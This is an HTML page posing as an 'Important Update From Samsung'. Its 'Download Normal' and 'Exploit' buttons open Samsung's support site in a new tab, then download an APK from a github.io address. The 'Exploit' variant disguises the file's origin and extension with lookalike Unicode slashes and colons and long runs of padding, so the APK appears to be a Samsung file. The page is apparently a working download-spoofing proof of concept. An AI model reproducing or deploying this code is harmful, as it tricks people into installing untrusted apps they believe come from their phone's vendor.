<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Urgent Update</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        #saveButton {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        #saveButton:hover {
            background-color: #0056b3;
        }

        #result {
            margin-top: 20px;
            font-size: 14px;
            color: #333;
        }
    </style>
    <script>
        function startNormal() {
            window.open('https://samsung.com/support', '_blank');

            setTimeout(async () => {
                const response = await fetch('https://kokurate.github.io/browser/rar-android-722.132.apk');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download =
                    'From https://www.samsung.com';
                link.click();
                URL.revokeObjectURL(url);
            }, 5000);
        }

        function startExploit() {
            window.open('https://samsung.com/support', '_blank');

            setTimeout(async () => {
                const response = await fetch('https://kokurate.github.io/browser/rar-android-722.132.apk');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download =
                    'From https∶⧸⧸www.samsung.com                              File ∶ samsungupdate.apk                                                                      For More Details Check https∶⧸⧸samsung.com⧸support                                       Extension ∶';
                link.click();
                URL.revokeObjectURL(url);
            }, 2000);
        }
    </script>
</head>

<body>

    <h1 style="margin-left: 30px;">Important Update From Samsung Apk</h1>

    <button id="saveButton" onclick="startNormal()">Download Normal</button>
    <br>
    <br>
    <button id="saveButton" onclick="startExploit()" style="background-color: red;">Exploit</button>

    <br>

</body>

</html>
